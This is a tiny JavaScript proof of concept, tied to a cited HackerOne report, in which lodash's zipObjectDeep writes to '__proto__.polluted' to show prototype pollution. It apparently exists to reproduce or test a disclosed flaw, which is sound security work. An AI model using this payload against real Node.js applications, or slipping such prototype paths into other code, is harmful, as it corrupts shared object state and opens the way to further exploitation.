// https://hackerone.com/reports/712065
  const _ = require("lodash");
  _.zipObjectDeep(["__proto__.polluted"], ["yes"]);
